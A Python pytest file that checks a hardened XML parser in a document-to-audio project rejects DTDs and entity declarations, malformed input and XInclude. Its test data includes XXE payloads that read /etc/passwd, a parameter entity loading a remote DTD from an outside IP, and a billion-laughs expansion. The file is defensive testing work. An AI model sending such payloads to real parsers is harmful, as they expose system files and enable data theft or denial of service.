# Copyright (c) 2026 Nikolai Zelensky
"""Tests for the hardened XML parser used by XML and FB2 extractors."""

import pytest

from audiodoc.document_engine.guards.xml_safe import parse_xml
from audiodoc.errors.documents import DocumentRejectedError


def _rejection(data: bytes) -> str:
    with pytest.raises(DocumentRejectedError) as caught:
        parse_xml(data)
    return str(caught.value)


@pytest.mark.parametrize(
    "payload",
    [
        b'<!DOCTYPE root [<!ENTITY x "expanded">]><root>&x;</root>',
        b'<!DOCTYPE FictionBook SYSTEM "file:///etc/passwd"><FictionBook/>',
        b'<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
        b'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://198.51.100.7/x.dtd">%p;]><r/>',
        (
            b'<!DOCTYPE lol [<!ENTITY a "ha"><!ENTITY b "&a;&a;&a;&a;">'
            b'<!ENTITY c "&b;&b;&b;&b;">]><lol>&c;</lol>'
        ),
        "<!DOCTYPE plain><plain>Текст</plain>".encode(),
    ],
    ids=["internal", "system-doctype", "external", "parameter", "laughs", "bare"],
)
def test_rejects_dtd_and_entity_declarations(payload: bytes) -> None:
    message = _rejection(payload)

    expected = "XML содержит запрещённые конструкции"
    assert message == expected, "a DTD or entity declaration was accepted"


@pytest.mark.parametrize(
    "payload",
    [
        b"",
        b"<root><unclosed></root>",
        b"<a></b>",
        b"just text, no markup",
        b"\xff\xfe<\x00r\x00",
        b"<r>\x00</r>",
        b"<r/><second/>",
    ],
    ids=repr,
)
def test_rejects_malformed_xml_with_a_safe_message(payload: bytes) -> None:
    message = _rejection(payload)

    expected = "Некорректный XML-документ"
    assert message == expected, "malformed XML leaked a parser message"


def test_parses_regular_xml() -> None:
    root = parse_xml(b"<?xml version='1.0'?><root><item>safe</item></root>")

    expected_text = "safe"
    assert root.findtext("item") == expected_text, "regular XML was not parsed"


def test_honours_the_declared_encoding() -> None:
    data = '<?xml version="1.0" encoding="windows-1251"?><r>Привет</r>'.encode("cp1251")

    root = parse_xml(data)

    expected_text = "Привет"
    assert root.text == expected_text, "the declared encoding was ignored"


def test_does_not_expand_xinclude() -> None:
    data = (
        b'<r xmlns:xi="http://www.w3.org/2001/XInclude">'
        b'<xi:include href="/etc/passwd" parse="text"/>ok</r>'
    )

    root = parse_xml(data)

    expected_text = "ok"
    assert "".join(root.itertext()) == expected_text, "XInclude was expanded"
